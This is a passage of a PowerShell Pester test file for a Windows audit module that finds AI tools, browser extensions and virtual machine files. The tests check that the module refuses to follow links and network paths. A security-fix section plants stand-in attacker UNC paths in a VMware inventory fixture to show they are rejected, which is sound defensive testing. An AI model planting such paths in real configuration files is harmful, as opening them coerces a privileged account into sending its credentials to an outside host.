            @(Get-TestToolById $st 'claude-in-chrome')[0].LeftoverOnly | Should -BeFalse
        }

        It 'finds Opera Neon installed for all users while it is closed' {
            # An install in Program Files has no profile folder, and Neon is not running.
            Set-TestBrowserConfig -Tools (Get-Content (Join-Path $script:RepoRoot 'config\ai-tools.json') -Raw) -Browsers (Get-Content (Join-Path $script:RepoRoot 'config\browser-profiles.json') -Raw)
            $p = Join-Path $TestDrive 'bx-neon'
            New-Item -ItemType Directory -Force -Path $p | Out-Null
            $neon = [pscustomobject]@{ Name = 'Opera Neon 1.0.4321.0'; Version = '1.0.4321.0'; Publisher = 'Opera Software'; KeyName = 'Opera Neon 1.0.4321.0' }
            $tool = @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p -Software @($neon)) 'opera-neon')
            @($tool[0].Signals) | Should -Be @('Installed program: Opera Neon 1.0.4321.0')
            $stable = [pscustomobject]@{ Name = 'Opera Stable 120.0.5543.0'; Version = '120.0.5543.0'; Publisher = 'Opera Software'; KeyName = 'Opera 120.0.5543.0' }
            @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p -Software @($stable)) 'opera-neon').Count | Should -Be 0 -Because 'plain Opera is not Neon'
        }

        It 'does not reach a skipped link through a folder name ending in a dot' {
            # Windows drops a trailing dot from each part of a path, so 'Profile 1.\Extensions' is read as
            # 'Profile 1\Extensions', through a link called 'Profile 1'.
            Set-TestBrowserConfig -Tools $CETestExtTools -Browsers $CETestBrowsers
            $links = New-Object System.Collections.ArrayList
            $dotted = New-Object System.Collections.ArrayList
            try {
                $case = {
                    param([string]$Name, [string]$Parent, [string]$LinkName, [string]$TargetTree)
                    $root = Join-Path $TestDrive "bx-dot-$Name"
                    New-TestTree (Join-Path $root 'profile') @($Parent)
                    New-TestTree (Join-Path $root 'target') @($TargetTree)
                    $l = Join-Path (Join-Path (Join-Path $root 'profile') $Parent) $LinkName
                    New-Item -ItemType Junction -Path $l -Target (Join-Path $root 'target') | Out-Null
                    [void]$links.Add($l)
                    # A plain folder whose name ends in a dot, next to the link; only a \\?\ path can create it.
                    [void][IO.Directory]::CreateDirectory('\\?\' + $l + '.')
                    [void]$dotted.Add($l + '.')
                    return (Join-Path $root 'profile')
                }
                $chrome = & $case 'c' $CETestChromeData 'Profile 1' "Extensions\$($CETestExtId.Claude)\1.0.94_0"
                $firefox = & $case 'f' 'AppData\Roaming\Mozilla\Firefox\Profiles' 'abcd1234.default-release' 'extensions\support@wordtune.com.xpi'
                foreach ($d in $dotted) { [IO.Directory]::Exists('\\?\' + $d) | Should -BeTrue }
                @(Get-TestBrowserMatch $chrome).Count | Should -Be 0 -Because 'the Chrome profile link is reached only through the name ending in a dot'
                @(Get-TestBrowserMatch $firefox).Count | Should -Be 0 -Because 'the Firefox profile link is reached only through the name ending in a dot'
                InModuleScope CEAudit -Parameters @{ P = (Join-Path $chrome $CETestChromeData) } {
                    param($P)
                    $names = Get-CEPlainChildName -Path $P -Max 10
                    @($names).Count | Should -Be 0
                    Test-CERelativePathText 'a\b' | Should -BeTrue
                    foreach ($bad in 'a.\b', 'a \b', 'a\b.', 'a\b ', '.', '..') { Test-CERelativePathText $bad | Should -BeFalse -Because $bad }
                }
            }
            finally {
                foreach ($d in $dotted) { if ([IO.Directory]::Exists('\\?\' + $d)) { [IO.Directory]::Delete('\\?\' + $d) } }
                foreach ($l in $links) { if ([IO.Directory]::Exists($l)) { [IO.Directory]::Delete($l) } }
            }
        }

        It 'does not follow links for AI tool profile folders or VS Code extensions' {
            Set-TestBrowserConfig -Tools @'
{ "schemaVersion": 2, "tools": [
  { "id": "t-folder", "name": "Folder tool", "canActOnDevice": false, "windows": { "paths": [ "AppData\\Local\\Vendor\\Tool", ".toolrc" ] } },
  { "id": "t-code", "name": "Code tool", "canActOnDevice": false, "windows": { "vscodeExtensions": [ "pub.ext-*" ] } }
] }
'@
            $links = New-Object System.Collections.ArrayList
            try {
                $plain = Join-Path $TestDrive 'lk-plain'
                New-TestTree $plain @('AppData\Local\Vendor\Tool', '.vscode\extensions\pub.ext-1.0.0')
                Set-Content -LiteralPath (Join-Path $plain '.toolrc') -Value '' -Encoding ASCII
                $st = Invoke-TestBrowserScan -ProfilePath $plain
                @(Get-TestToolById $st 't-folder')[0].Signals | Should -Be @('Found %USERPROFILE%\AppData\Local\Vendor\Tool', 'Found %USERPROFILE%\.toolrc')
                @(Get-TestToolById $st 't-code')[0].Signals | Should -Be @('VS Code extension: pub.ext-1.0.0')

                $case = {
                    # A profile whose Link folder is a junction to a target holding TargetTree.
                    param([string]$Name, [string]$Link, [string]$TargetTree)
                    $root = Join-Path $TestDrive "lk-$Name"
                    New-Item -ItemType Directory -Force -Path (Join-Path $root 'profile') | Out-Null
                    if (Split-Path -Parent $Link) { New-Item -ItemType Directory -Force -Path (Join-Path (Join-Path $root 'profile') (Split-Path -Parent $Link)) | Out-Null }
                    New-TestTree (Join-Path $root 'target') @($TargetTree)
                    $l = Join-Path (Join-Path $root 'profile') $Link
                    New-Item -ItemType Junction -Path $l -Target (Join-Path $root 'target') | Out-Null
                    [void]$links.Add($l)
                    return (Join-Path $root 'profile')
                }
                $cases = @{
                    'a folder on the way' = & $case 'a' 'AppData\Local\Vendor' 'Tool'
                    'the VS Code folder'  = & $case 'c' '.vscode' 'extensions\pub.ext-1.0.0'
                }
                foreach ($k in $cases.Keys) {
                    @((Invoke-TestBrowserScan -ProfilePath $cases[$k] -Elevated).Tools).Count | Should -Be 0 -Because "$k is a junction, and an elevated audit does not follow the user's links"
                    @((Invoke-TestBrowserScan -ProfilePath $cases[$k] -System).Tools).Count | Should -Be 0 -Because "$k is a junction, and a SYSTEM audit does not follow the user's links"
                    @((Invoke-TestBrowserScan -ProfilePath $cases[$k]).Tools).Count | Should -Be 1 -Because "$k is the user's own link, followed in their non-elevated session"
                }
                # The folder itself may be a link (moved to another drive, say): it is found by its own
                # attributes and not followed.
                $moved = & $case 'b' 'AppData\Local\Vendor\Tool' 'x'
                @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $moved -Elevated) 't-folder')[0].Signals | Should -Be @('Found %USERPROFILE%\AppData\Local\Vendor\Tool')
                InModuleScope CEAudit -Parameters @{ P = $moved } {
                    param($P)
                    Test-CEPlainProfileItem -ProfilePath $P -Relative 'AppData\Local\Vendor\Tool' | Should -BeTrue
                    Test-CEPlainProfileItem -ProfilePath $P -Relative 'AppData\Local\Vendor\Tool' -NoLink | Should -BeFalse -Because '-NoLink is for callers that go on to use the path'
                    Test-CEPlainProfileItem -ProfilePath $P -Relative 'AppData\Local\Vendor' -NoLink | Should -BeTrue
                }
            }
            finally {
                foreach ($l in $links) { if ([IO.Directory]::Exists($l)) { [IO.Directory]::Delete($l) } }
            }
        }

        It "follows the user's own links only in their non-elevated session" {
            # A developer who moved Chrome's User Data to another drive with a junction still has their
            # extensions found by the per-user probe; an elevated or SYSTEM audit does not follow it.
            Set-TestBrowserConfig -Tools $CETestExtTools -Browsers $CETestBrowsers
            $root = Join-Path $TestDrive 'bx-own-links'
            New-TestTree (Join-Path $root 'profile') @('AppData\Local\Google\Chrome')
            New-TestTree (Join-Path $root 'other-drive') @("Profile 1\Extensions\$($CETestExtId.Claude)\1.0_0")
            $l = Join-Path $root "profile\$CETestChromeData"
            New-Item -ItemType Junction -Path $l -Target (Join-Path $root 'other-drive') | Out-Null
            try {
                $p = Join-Path $root 'profile'
                @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p) 't-claude')[0].Signals | Should -Be @("Google Chrome extension: $($CETestExtId.Claude) 1.0 (profile: Profile 1)")
                @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p -Elevated) 't-claude').Count | Should -Be 0 -Because 'an elevated audit has more rights than the user'
                @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p -System) 't-claude').Count | Should -Be 0
            }
            finally { if ([IO.Directory]::Exists($l)) { [IO.Directory]::Delete($l) } }
            InModuleScope CEAudit {
                Test-CEAboveUserRights -Context ([pscustomobject]@{ IsSystem = $false; IsElevated = $false }) | Should -BeFalse
                Test-CEAboveUserRights -Context ([pscustomobject]@{ IsSystem = $false; IsElevated = $true }) | Should -BeTrue
                Test-CEAboveUserRights -Context ([pscustomobject]@{ IsSystem = $true }) | Should -BeTrue
                Test-CEAboveUserRights -Context $null | Should -BeTrue -Because 'no context is treated as the stricter case'
            }
        }

        It "looks for VS Code's built-in extensions under the profile through plain folders only" {
            # Its own It: Invoke-TestBrowserScan mocks Get-CEVsCodeBuiltInExtensionDir for the rest of the one it runs in.
            $links = New-Object System.Collections.ArrayList
            try {
                $vs = Join-Path $TestDrive 'lk-vscode'
                New-TestTree $vs @('AppData\Local\Programs\Microsoft VS Code\abc\resources\app\extensions\copilot')
                New-TestTree (Join-Path $TestDrive 'lk-vscode-target') @('resources\app\extensions\copilot')
                $l = Join-Path $vs 'AppData\Local\Programs\Microsoft VS Code\def'
                New-Item -ItemType Junction -Path $l -Target (Join-Path $TestDrive 'lk-vscode-target') | Out-Null
                [void]$links.Add($l)
                $dirs = InModuleScope CEAudit -Parameters @{ P = $vs } { param($P) $d = Get-CEVsCodeBuiltInExtensionDir -ProfilePath $P; $d }
                @($dirs | Where-Object { $_.StartsWith($vs) }) | Should -Be @((Join-Path $vs 'AppData\Local\Programs\Microsoft VS Code\abc\resources\app\extensions'))
                # In the user's own session their link is followed.
                $dirs = InModuleScope CEAudit -Parameters @{ P = $vs } { param($P) $d = Get-CEVsCodeBuiltInExtensionDir -ProfilePath $P -FollowLinks; $d }
                @($dirs | Where-Object { $_.StartsWith($vs) } | Sort-Object) | Should -Be @((Join-Path $vs 'AppData\Local\Programs\Microsoft VS Code\abc\resources\app\extensions'), (Join-Path $vs 'AppData\Local\Programs\Microsoft VS Code\def\resources\app\extensions'))
            }
            finally {
                foreach ($l in $links) { if ([IO.Directory]::Exists($l)) { [IO.Directory]::Delete($l) } }
            }
        }

        It "reads a built-in VS Code extension's package.json only when it is small and not a link" {
            # The per-user install is in a profile the user controls, and a SYSTEM audit reads it.
            $dir = Join-Path $TestDrive 'lk-vscode-pkg\resources\app\extensions'
            New-TestTree $dir @('copilot', 'big', 'nopkg', 'broken')
            Set-Content -LiteralPath (Join-Path $dir 'copilot\package.json') -Value '{ "name": "copilot-chat", "publisher": "GitHub" }' -Encoding ASCII
            [IO.File]::WriteAllText((Join-Path $dir 'big\package.json'), ('{ "name": "file", "publisher": "big", "pad": "' + ('x' * (2MB + 16)) + '" }'))
            Set-Content -LiteralPath (Join-Path $dir 'broken\package.json') -Value '{ not json' -Encoding ASCII
            InModuleScope CEAudit -Parameters @{ D = $dir } {
                param($D)
                Get-CEVsCodeBuiltInExtensionId -Folder (Join-Path $D 'copilot') | Should -Be 'github.copilot-chat'
                Get-CEVsCodeBuiltInExtensionId -Folder (Join-Path $D 'big') | Should -Be 'big' -Because 'a package.json over 2 MB is not read'
                Get-CEVsCodeBuiltInExtensionId -Folder (Join-Path $D 'nopkg') | Should -Be 'nopkg'
                Get-CEVsCodeBuiltInExtensionId -Folder (Join-Path $D 'broken') | Should -Be 'broken'
                $budget = [long]10
                Get-CEVsCodeBuiltInExtensionId -Folder (Join-Path $D 'copilot') -Budget ([ref]$budget) | Should -Be 'copilot' -Because 'the byte budget is used up'
                $budget = [long]1000
                Get-CEVsCodeBuiltInExtensionId -Folder (Join-Path $D 'copilot') -Budget ([ref]$budget) | Should -Be 'github.copilot-chat'
                $budget | Should -BeLessThan 1000 -Because 'what was read comes off the budget'
                # The budget counts bytes, not characters: 100 euro signs are 300 bytes in UTF-8.
                $euro = Join-Path $TestDrive 'lk-vscode-euro'
                New-Item -ItemType Directory -Force -Path $euro | Out-Null
                [IO.File]::WriteAllText((Join-Path $euro 'package.json'), ('{ "name": "e", "publisher": "p", "pad": "' + ([string][char]0x20AC * 100) + '" }'), (New-Object Text.UTF8Encoding $false))
                $bytes = (New-Object IO.FileInfo (Join-Path $euro 'package.json')).Length
                $bytes | Should -BeGreaterThan 300
                $budget = [long]1000
                Get-CEVsCodeBuiltInExtensionId -Folder $euro -Budget ([ref]$budget) | Should -Be 'p.e'
                $budget | Should -Be (1000 - $bytes) -Because 'the file length comes off the budget'
                Read-CEBoundedText -Path (Join-Path $D 'big\package.json') -MaxBytes 1MB | Should -BeNullOrEmpty
                Read-CEBoundedText -Path (Join-Path $D 'copilot') -MaxBytes 1MB | Should -BeNullOrEmpty -Because 'a folder is not a file'
                Read-CEBoundedText -Path (Join-Path $D 'copilot\package.json') -MaxBytes 1MB | Should -Match 'copilot-chat'
                # Files a user controls are read through Read-CEBoundedText and folders listed with a cap.
                foreach ($f in 'Get-CEVsCodeBuiltInExtensionId', 'Get-CEAIToolStateUncached', 'Get-CEVMwareMachine', 'Get-CEVirtualBoxMachine', 'Get-CEWslNetworkingMode', 'Read-CENamedVmFile', 'Get-CEFolderChainProblem') {
                    (Get-Command $f -CommandType Function).ScriptBlock.ToString() | Should -Not -Match 'Get-Content|Get-ChildItem|ReadAll|Test-Path' -Because $f
                }
            }
            # End to end: Copilot Chat is recognised, and the oversized file falls back to its folder name.
            $st = InModuleScope CEAudit -Parameters @{ D = $dir } {
                param($D)
                $script:pkgDir = $D
                Mock Get-CEVsCodeBuiltInExtensionDir { , @($script:pkgDir) }
                Mock Get-CEUserProfilePath { $null }
                Mock Get-CEInstalledSoftware { @() }
                Mock Get-CEStorePackageName { , @() }
                Mock Get-CEProcessList { , @() }
                Get-CEAIToolStateUncached -Context ([pscustomobject]@{ IsSystem = $true })
            }
            @(Get-TestToolById $st 'github-copilot-vscode')[0].Signals | Should -Be @('VS Code built-in extension: github.copilot-chat')
        }

        It "does not follow a built-in VS Code extension's package.json that is a symbolic link" {
            $dir = Join-Path $TestDrive 'lk-vscode-pkglink'
            New-TestTree $dir @('copilot', 'linked')
            Set-Content -LiteralPath (Join-Path $dir 'copilot\package.json') -Value '{ "name": "copilot-chat", "publisher": "GitHub" }' -Encoding ASCII
            $link = Join-Path $dir 'linked\package.json'
            try { New-Item -ItemType SymbolicLink -Path $link -Target (Join-Path $dir 'copilot\package.json') -ErrorAction Stop | Out-Null }
            catch { Set-ItResult -Skipped -Because "this account can't create symbolic links: $($_.Exception.Message)"; return }
            try { InModuleScope CEAudit -Parameters @{ D = $dir } { param($D) Get-CEVsCodeBuiltInExtensionId -Folder (Join-Path $D 'linked') | Should -Be 'linked' } }
            finally { Remove-Item -LiteralPath $link -Force }
        }

        It 'does not follow a directory symbolic link below the profile' {
            Set-TestBrowserConfig -Tools $CETestExtTools -Browsers $CETestBrowsers
            $root = Join-Path $TestDrive 'bx-symlink'
            New-TestTree (Join-Path $root 'profile') @("$CETestChromeData\Profile 1")
            New-TestTree (Join-Path $root 'target') @("Extensions\$($CETestExtId.Claude)\1.0_0")
            $link = Join-Path $root "profile\$CETestChromeData\Profile 2"
            try { New-Item -ItemType SymbolicLink -Path $link -Target (Join-Path $root 'target') -ErrorAction Stop | Out-Null }
            catch { Set-ItResult -Skipped -Because "this account can't create symbolic links: $($_.Exception.Message)"; return }
            try { @(Get-TestBrowserMatch (Join-Path $root 'profile')).Count | Should -Be 0 }
            finally { if ([IO.Directory]::Exists($link)) { [IO.Directory]::Delete($link) } }
        }

        It 'stops at the profile and folder limits in browser-profiles.json' {
            $p = Join-Path $TestDrive 'bx-caps'
            New-TestTree $p @(1..3 | ForEach-Object { "$CETestChromeData\Profile $_\Extensions\$($CETestExtId.Claude)\1.0_0" })
            Set-TestBrowserConfig -Tools $CETestExtTools -Browsers ($CETestBrowsers -replace '"maxProfilesPerBrowser": 64', '"maxProfilesPerBrowser": 2')
            @(Get-TestBrowserMatch $p).Count | Should -Be 2

            $q = Join-Path $TestDrive 'bx-caps-entries'
            New-TestTree $q @("$CETestChromeData\Default\Extensions\$($CETestExtId.Early)\1.0_0", "$CETestChromeData\Default\Extensions\$($CETestExtId.Claude)\1.0_0")
            Set-TestBrowserConfig -Browsers ($CETestBrowsers -replace '"maxEntriesPerFolder": 2000', '"maxEntriesPerFolder": 1')
            { Get-TestBrowserMatch $q } | Should -Not -Throw
            @(Get-TestBrowserMatch $q).Count | Should -Be 0 -Because 'the first entry used up the listing limit'
        }

        It "looks in the signed-in user's profile when run as SYSTEM, and never on a network path" {
            $p = Join-Path $TestDrive 'bx-system'
            New-TestTree $p @("$CETestChromeData\Profile 1\Extensions\$($CETestExtId.Claude)\1.0_0")
            Set-TestBrowserConfig -Tools $CETestExtTools -Browsers $CETestBrowsers
            $st = Invoke-TestBrowserScan -ProfilePath $p -System
            $st.ProfileChecked | Should -BeTrue
            @(Get-TestToolById $st 't-claude')[0].Signals | Should -Contain "Google Chrome extension: $($CETestExtId.Claude) 1.0 (profile: Profile 1)"

            $st = Invoke-TestBrowserScan -ProfilePath '' -System
            $st.ProfileChecked | Should -BeFalse -Because 'no user signed in at the console was found'
            @($st.Tools).Count | Should -Be 0

            # A profile path on another machine is never listed.
            @(Get-TestBrowserMatch '\\host\share\paul').Count | Should -Be 0
            InModuleScope CEAudit {
                $r = Get-CEBrowserExtensionList -ProfilePath '\\host\share\paul' -ChromiumIds @{ 'fcoeoabgfenejglbffodgkkbkcdhcgfn' = $true } -FirefoxIds @{}
                ($null -eq $r) | Should -BeFalse
                @($r).Count | Should -Be 0
            }

            Set-TestAITools -Tools @() -ProfileChecked $false
            $f = @(Invoke-CEAuditCore -Id 'SC-14')
            $f[0].Status | Should -Be 'NotApplicable'
            # Only the console user is found as SYSTEM, so someone signed in over Remote Desktop is not 'no one'.
            $f[0].Actual | Should -Be 'No recognised AI tools found. No user signed in at the console was found, so browser extensions and profile folders were not checked'
        }
    }
}

Describe 'Security review fixes' {
    Context 'VM inventory paths (credential coercion)' {
        It 'accepts only absolute local fixed-drive paths' {
            InModuleScope CEAudit {
                Test-CELocalFilePath 'C:\Users\paul\vm.vmx' | Should -BeTrue
                Test-CELocalFilePath '\\attacker\share\x.vmx' | Should -BeFalse
                Test-CELocalFilePath '//attacker/share/x.vmx' | Should -BeFalse
                Test-CELocalFilePath '\\?\UNC\attacker\share\x.vmx' | Should -BeFalse
                Test-CELocalFilePath '\\.\C:\x.vmx' | Should -BeFalse
                Test-CELocalFilePath 'C:x.vmx' | Should -BeFalse
                Test-CELocalFilePath '\x.vmx' | Should -BeFalse
                Test-CELocalFilePath 'x.vmx' | Should -BeFalse
                Test-CELocalFilePath '' | Should -BeFalse
            }
        }

        It 'never opens a UNC path named in a user VM inventory file' {
            InModuleScope CEAudit {
                $profileDir = Join-Path $TestDrive ([guid]::NewGuid().ToString('n'))
                New-Item -ItemType Directory -Force -Path (Join-Path $profileDir 'AppData\Roaming\VMware') | Out-Null
                Set-Content -LiteralPath (Join-Path $profileDir 'AppData\Roaming\VMware\inventory.vmls') -Value 'vmlist1.config = "\\attacker-host\share\evil.vmx"'
                # The guard rejects the UNC path, so no VM is returned and the share is never opened
                # (an opened UNC path would coerce SYSTEM to authenticate). The guard itself is unit-tested above.
                # Assign first: the function returns ,@() and @()-wrapping the call inline nests it (see CONTRIBUTING.md).
                $vms = Get-CEVMwareMachine -ProfilePath $profileDir
                @($vms).Count | Should -Be 0
                Test-CELocalFilePath '\\attacker-host\share\evil.vmx' | Should -BeFalse
            }
        }

        It 'reads VM inventories only through plain folders and up to a size limit' {
            # A plain inventory is read. Its VM file is below the profile, so the folders checked on the
            # way are the fixture's, not those of this machine's TEMP.
            $plain = Join-Path $TestDrive 'vm-plain'
            $vmx = Join-Path $plain 'VMs\lab.vmx'
            New-Item -ItemType Directory -Force -Path (Join-Path $plain 'AppData\Roaming\VMware'), (Split-Path -Parent $vmx) | Out-Null
            Set-Content -LiteralPath $vmx -Value 'displayName = "Lab"'
            $line = "vmlist1.config = `"$vmx`""
            Set-Content -LiteralPath (Join-Path $plain 'AppData\Roaming\VMware\inventory.vmls') -Value $line
            # One reached through a junction the user made is not.
            $linked = Join-Path $TestDrive 'vm-linked'
            New-Item -ItemType Directory -Force -Path (Join-Path $linked 'AppData\Roaming'), (Join-Path $TestDrive 'vm-target') | Out-Null
            Set-Content -LiteralPath (Join-Path $TestDrive 'vm-target\inventory.vmls') -Value $line
            $link = Join-Path $linked 'AppData\Roaming\VMware'
            New-Item -ItemType Junction -Path $link -Target (Join-Path $TestDrive 'vm-target') | Out-Null
            # And one over 1 MB is not read at all.
            $big = Join-Path $TestDrive 'vm-big'
            New-Item -ItemType Directory -Force -Path (Join-Path $big 'AppData\Roaming\VMware') | Out-Null
            [IO.File]::WriteAllText((Join-Path $big 'AppData\Roaming\VMware\inventory.vmls'), ($line + "`r`n" + ('#' * (1MB + 16))))
            try {
                InModuleScope CEAudit -Parameters @{ Plain = $plain; Linked = $linked; Big = $big } {
                    param($Plain, $Linked, $Big)
                    $vms = Get-CEVMwareMachine -ProfilePath $Plain
                    @($vms).Count | Should -Be 1
                    $vms = Get-CEVMwareMachine -ProfilePath $Linked
                    @($vms).Count | Should -Be 0 -Because 'the VMware folder is a junction'
                    $vms = Get-CEVMwareMachine -ProfilePath $Big
                    @($vms).Count | Should -Be 0 -Because 'the inventory is over the size limit'
                }
            }
            finally { if ([IO.Directory]::Exists($link)) { [IO.Directory]::Delete($link) } }
        }

        It 'treats only junctions and symbolic links as links, not downloaded cloud files' {
            InModuleScope CEAudit {
                $hex = { param($h) [Convert]::ToInt64($h, 16) }
                $script:testTag = [long]0
                Mock Get-CEReparseTag { $script:testTag }
                # Attributes as numbers: FILE_ATTRIBUTE_RECALL_ON_DATA_ACCESS is not in .NET's FileAttributes.
                $item = { param($attrs) [pscustomobject]@{ Attributes = [long]$attrs; FullName = 'C:\x\lab.vmx'; Name = 'lab.vmx' } }
                Test-CELinkItem (& $item 0x20) | Should -BeFalse -Because 'not a reparse point'
                $cases = [ordered]@{
                    'a junction'                          = @{ Tag = (& $hex 'A0000003'); Link = $true }
                    'a symbolic link'                     = @{ Tag = (& $hex 'A000000C'); Link = $true }
                    'a WSL symbolic link'                 = @{ Tag = (& $hex 'A000001D'); Link = $true }
                    'a downloaded OneDrive or Proton file' = @{ Tag = (& $hex '9000601A'); Link = $false }
                    'a deduplicated file'                 = @{ Tag = (& $hex '80000013'); Link = $false }
                    'a tag that cannot be read'           = @{ Tag = [long]-1; Link = $true }
                }
                foreach ($k in $cases.Keys) {
                    $script:testTag = [long]$cases[$k].Tag
                    Test-CELinkItem (& $item 0x420) | Should -Be $cases[$k].Link -Because $k
                }
                $script:testTag = & $hex '9000601A'
                Get-CEUserFileSkipReason (& $item 0x420) | Should -Be '' -Because 'a downloaded cloud file is read'
                Get-CEUserFileSkipReason (& $item 0x401420) | Should -Match 'stored online only' -Because 'reading it would download it'
                Get-CEUserFileSkipReason (& $item 0x1420) | Should -Match 'stored online only' -Because 'an offline file is not on the device'
                $script:testTag = & $hex 'A000000C'
                Get-CEUserFileSkipReason (& $item 0x420) | Should -Match 'junction or symbolic link'
            }
        }

        It 'reads the reparse tag of a real junction and folder without opening them' {
            $dir = Join-Path $TestDrive 'tag-real'
            New-Item -ItemType Directory -Force -Path (Join-Path $dir 'target') | Out-Null
            $j = Join-Path $dir 'junction'
            New-Item -ItemType Junction -Path $j -Target (Join-Path $dir 'target') | Out-Null
            try {
                InModuleScope CEAudit -Parameters @{ D = $dir; J = $j } {
                    param($D, $J)
                    Get-CEReparseTag $J | Should -Be ([Convert]::ToInt64('A0000003', 16))
                    Test-CELinkItem (New-Object IO.DirectoryInfo $J) | Should -BeTrue
                    Get-CEReparseTag (Join-Path $D 'target') | Should -Be 0
                    Get-CEReparseTag (Join-Path $D 'missing') | Should -Be -1
                    Get-CEReparseTag (Join-Path $D 'j*') | Should -Be -1 -Because 'a wildcard would name another item'
                }
            }
            finally { [IO.Directory]::Delete($j) }
        }

        It 'does not read a VM file through a link on the way to it as SYSTEM or elevated, and says it found it' {
            $real = Join-Path $TestDrive 'vm-chain-real'
            New-Item -ItemType Directory -Force -Path $real | Out-Null
            Set-Content -LiteralPath (Join-Path $real 'lab.vmx') -Value @('displayName = "Lab"', 'ethernet0.present = "TRUE"', 'ethernet0.connectionType = "bridged"')
            Set-Content -LiteralPath (Join-Path $real 'Win.vbox') -Value '<VirtualBox xmlns="http://www.virtualbox.org/"><Machine name="Win"/></VirtualBox>'
            $prof = Join-Path $TestDrive 'vm-chain-profile'
            New-Item -ItemType Directory -Force -Path (Join-Path $prof 'AppData\Roaming\VMware'), (Join-Path $prof '.VirtualBox') | Out-Null
            # The junction is below the profile, so only the fixture's folders are checked on the way to it.
            $via = Join-Path $prof 'vm-chain-via'
            New-Item -ItemType Junction -Path $via -Target $real | Out-Null
            Set-Content -LiteralPath (Join-Path $prof 'AppData\Roaming\VMware\inventory.vmls') -Value "vmlist1.config = `"$via\lab.vmx`""
            Set-Content -LiteralPath (Join-Path $prof '.VirtualBox\VirtualBox.xml') -Value "<VirtualBox xmlns=`"http://www.virtualbox.org/`"><Global><MachineRegistry><MachineEntry uuid=`"{1}`" src=`"$via\Win.vbox`"/></MachineRegistry></Global></VirtualBox>"
            try {
                InModuleScope CEAudit -Parameters @{ P = $prof; V = $via } {
                    param($P, $V)
                    $notes = New-Object System.Collections.ArrayList
                    $vms = Get-CEVMwareMachine -ProfilePath $P -Notes $notes
                    @($vms).Count | Should -Be 0 -Because 'a folder on the way to the .vmx is a junction'
                    $vbox = Get-CEVirtualBoxMachine -ProfilePath $P -Notes $notes
                    @($vbox).Count | Should -Be 0 -Because 'a folder on the way to the .vbox is a junction'
                    @($notes).Count | Should -Be 2
                    @($notes) | Should -Be @(
                        "VMware virtual machine file $V\lab.vmx found, not read: the folder $V on the way to it is a junction or symbolic link",
                        "VirtualBox virtual machine file $V\Win.vbox found, not read: the folder $V on the way to it is a junction or symbolic link")
                    # In the user's own session their links are followed.
                    $vms = Get-CEVMwareMachine -ProfilePath $P -FollowLinks
                    @($vms | ForEach-Object { $_.Name }) | Should -Be @('Lab')
                    $vbox = Get-CEVirtualBoxMachine -ProfilePath $P -FollowLinks
                    @($vbox | ForEach-Object { $_.Name }) | Should -Be @('Win')
                    # The profile folder itself may be a link: a VM file below it is checked from there.
                    Get-CEFolderChainProblem -Path (Join-Path $V 'lab.vmx') -ProfilePath $V | Should -Be ''
                    Get-CEFolderChainProblem -Path (Join-Path $V 'none\lab.vmx') -ProfilePath $V | Should -Be 'missing'
                }
            }
            finally { [IO.Directory]::Delete($via) }
        }

        It 'checks every folder from the drive root for a VM file outside the profile' {
            # The .vmx is at outside\via\lab.vmx, where via is a junction, and the inventory is in another
            # folder, so the check starts at the drive root. Only via counts as a link, so the folders
            # above TestDrive (TEMP and its parents) never matter.
            $outside = Join-Path $TestDrive 'outside'
            $real = Join-Path $TestDrive 'outside-real'
            $prof = Join-Path $TestDrive 'outside-profile'
            New-Item -ItemType Directory -Force -Path $outside, $real, (Join-Path $prof 'AppData\Roaming\VMware') | Out-Null
            Set-Content -LiteralPath (Join-Path $real 'lab.vmx') -Value @('displayName = "Lab"', 'ethernet0.present = "TRUE"', 'ethernet0.connectionType = "bridged"')
            $via = Join-Path $outside 'via'
            New-Item -ItemType Junction -Path $via -Target $real | Out-Null
            $vmx = Join-Path $via 'lab.vmx'
            Set-Content -LiteralPath (Join-Path $prof 'AppData\Roaming\VMware\inventory.vmls') -Value "vmlist1.config = `"$vmx`""
            try {
                InModuleScope CEAudit -Parameters @{ P = $prof; V = $via; F = $vmx; O = $outside } {
                    param($P, $V, $F, $O)
                    $script:testVia = $V
                    Mock Test-CELinkItem { ([string]$Item.FullName).TrimEnd('\') -eq $script:testVia }
                    $notes = New-Object System.Collections.ArrayList
                    $vms = Get-CEVMwareMachine -ProfilePath $P -Notes $notes
                    @($vms).Count | Should -Be 0 -Because 'a folder on the way from the drive root is a junction'
                    @($notes) | Should -Be @("VMware virtual machine file $F found, not read: the folder $V on the way to it is a junction or symbolic link")
                    Get-CEFolderChainProblem -Path $F -ProfilePath $P | Should -Be "the folder $V on the way to it is a junction or symbolic link"
                    Get-CEFolderChainProblem -Path (Join-Path $O 'lab.vmx') -ProfilePath $P | Should -Be '' -Because 'every folder from the drive root to outside is plain'
                    # In the user's own session their links are followed.
                    $vms = Get-CEVMwareMachine -ProfilePath $P -FollowLinks
                    @($vms | ForEach-Object { $_.Name }) | Should -Be @('Lab')
                }
            }
            finally { [IO.Directory]::Delete($via) }
        }

        It 'reports a VM file too large to read as a plain note, not as one only the user''s session reads' {
            $prof = Join-Path $TestDrive 'vm-big-profile'
            $dir = Join-Path $prof 'VMs'
            New-Item -ItemType Directory -Force -Path $dir, (Join-Path $prof 'AppData\Roaming\VMware') | Out-Null
            $big = Join-Path $dir 'big.vmx'
            [IO.File]::WriteAllBytes($big, (New-Object byte[] (1MB + 16)))
            Set-Content -LiteralPath (Join-Path $prof 'AppData\Roaming\VMware\inventory.vmls') -Value "vmlist1.config = `"$big`""
            $note = "VMware virtual machine file $big found, not read: it is larger than 1 MB"
            $states = InModuleScope CEAudit -Parameters @{ P = $prof } {
                param($P)
                $script:testVmProfile = $P
                Mock Get-CEUserProfilePath { $script:testVmProfile }
                Mock Get-CEWslDistribution { , @() }
                Mock Get-CEHyperVMachine { [pscustomobject]@{ Readable = $true; Message = ''; Machines = @(); NatMappings = @() } }
                Mock Get-CEContainer { , @() }
                Mock Get-CEVirtualisationListener { , @() }
                [pscustomobject]@{
                    User     = Get-CEVirtualisationStateUncached -Context ([pscustomobject]@{ IsSystem = $false; IsElevated = $false })
                    Elevated = Get-CEVirtualisationStateUncached -Context ([pscustomobject]@{ IsSystem = $false; IsElevated = $true })
                }
            }
            foreach ($k in 'User', 'Elevated') {
                $st = $states.$k
                @($st.VMware).Count | Should -Be 0
